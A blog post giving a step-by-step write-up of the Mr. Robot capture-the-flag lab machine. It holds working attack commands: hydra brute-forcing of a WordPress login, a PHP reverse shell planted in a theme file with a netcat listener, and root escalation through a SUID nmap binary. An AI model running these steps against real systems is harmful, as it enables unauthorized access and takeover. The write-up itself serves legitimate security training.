---
layout: post
title: "Mr. Robot CTF Write-up"
date: 2024-09-28
categories: ctf-writeups
---

We need to find **three keys** to solve this machine. Let's start gathering information.

---

## Step 1: Nmap Scan

Run the following Nmap command:
```bash
nmap -T5 -p- -A - [target machine IP]
```

- **`T5`**: Scan speed (1-5)
- **`-p-`**: Scan all ports
- **`-A`**: Display all information
- **Optionally**: Add `-oN nmap_output.txt` to save the output to a text file.

![Nmap Scan Output](/assets/writeup_assets/mr-robot-ctf-writeup/figure_1.png "Figure 1: Nmap Scan Output")
*Figure 1: Nmap Scan Output*

We can see that **SSH is closed** on port 22, but **HTTP** and **HTTPS** are open on their standard ports. Let's use Dirbuster on port 80 to find interesting files or directories.

---

## Step 2: Dirbuster and robots.txt

Run the following command to scan for directories:
```bash
dirb http://[target machine IP]
```

We find several interesting files, and one that stands out is **robots.txt**. Visiting `http://[target machine IP]/robots.txt` shows us the following:

![robots.txt](/assets/writeup_assets/mr-robot-ctf-writeup/figure_2.png "Figure 2: Displaying robots.txt")
*Figure 2: Displaying robots.txt*

This page gives us some useful information. For example, we can enter `http://[target machine IP]/key-1-of-3.txt` in our browser and get the **first key**. Let's also check out the other entries.

---

## Step 3: Using fsocity.dic and Burp Suite

Next, we download the **fsocity.dic** file (despite the typo in its name) and inspect it using `cat`. It turns out to be a very long wordlist.

We also find a **/wp-login** page. After submitting an incorrect login, we notice that the error message is verbose, which suggests we might be able to **brute-force the username** using the wordlist. 

Let's capture a login request using **Burp Suite**:

![Burp Suite Login Capture](/assets/writeup_assets/mr-robot-ctf-writeup/figure_3.png "Figure 3: Burp Suite Login Capture")
*Figure 3: Burp Suite Login Capture*

The important part here is how the **username** and **password** are passed to the web service. Using this information, we can try to brute-force the login using **hydra**:

```bash
hydra -L fsocity.dic -p test [target machine IP] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```

- **`-L`**: Specify the wordlist
- **`-p`**: Specify the password
- **`http-post-form`**: The method we tell Hydra to use (since we saw a POST request in Figure 3)
- **`^USER^`** and **`^PWD^`**: Where hydra will input the username and password
- **`Invalid username`**: The error message when an incorrect username is input
- **`-t 30`**: Use 30 threads

![Hydra Output](/assets/writeup_assets/mr-robot-ctf-writeup/figure_4.png "Figure 4: Hydra Output")
*Figure 4: Hydra Output*

We found two usernames. Let’s focus on the first one: **Elliot**. Now, let’s use hydra again to find Elliot's password:

```bash
hydra -l Elliot -P fsocity.dic [target machine IP] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```
---

## Step 4: Setting up the reverse shell

Once hydra finds the password, we can log in to the WordPress admin panel and head to **Appearance > Editor** to set up a reverse shell. 

Go to **archive.php** in the theme editor and replace the code with a **reverse shell** from PentestMonkey:
- Copy the raw content from the [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) github repo.
- Replace the IP and port fields (port 53 in this case).
- Save the changes.

![Reverse Shell Setup](/assets/writeup_assets/mr-robot-ctf-writeup/figure_5.png "Figure 5: Reverse Shell Setup")
*Figure 5: Reverse Shell Setup*

Next, set up a **netcat listener**:
```bash
rlwrap nc -lvnp 53
```

- **`rlwrap`**: Provides quality-of-life features
- **`nc`**: Netcat command
- **`-lvnp`**: Listen verbose with reverse name lookup
- **`53`**: The port number we chose for the reverse shell

Now, visit `http://[target machine IP]/wp-content/themes/twentyfifteen/archive.php` to trigger the reverse shell.

---

## Step 5: Cracking the hashed password

In the shell, we find a **hashed password**, but we can’t access **key-2-of-3.txt** since we aren’t the user **robot**. Use [CrackStation.net](https://crackstation.net/) to crack the password. The result is **"abcdefghijklmnopqrstuvwxyz"**.

We also need to make our shell **interactive** in order to switch users and use the **su** command.

![Switching Users](/assets/writeup_assets/mr-robot-ctf-writeup/figure_6.png "Figure 6: Switching Users")
*Figure 6: Switching Users*

Now, we can cat out **key-2-of-3.txt**:

![key-2-of-3.txt](/assets/writeup_assets/mr-robot-ctf-writeup/figure_7.png "Figure 7: key-2-of-3.txt")
*Figure 7: Displaying key-2-of-3.txt*

---

## Step 6: Finding the final key (root)

The last key likely requires root privileges. We can search for **SUID binaries** using this command:

```bash
find / -perm +6000 2>/dev/null | grep '/bin/'
```

We find an **Nmap binary** that can be used to spawn a shell. Check [GTFObins](https://gtfobins.github.io/) for instructions. Run:

```bash
/usr/local/bin/nmap --interactive
```

Once Nmap is interactive, enter:
```bash
!sh
```

Now, we can retrieve **key-3-of-3.txt** from the root directory.

![key-3-of-3.txt](/assets/writeup_assets/mr-robot-ctf-writeup/figure_8.png "Figure 8: key-3-of-3.txt")
*Figure 8: Displaying key-3-of-3.txt*

---

That's it! We have found all three keys and completed the **Mr. Robot CTF**.

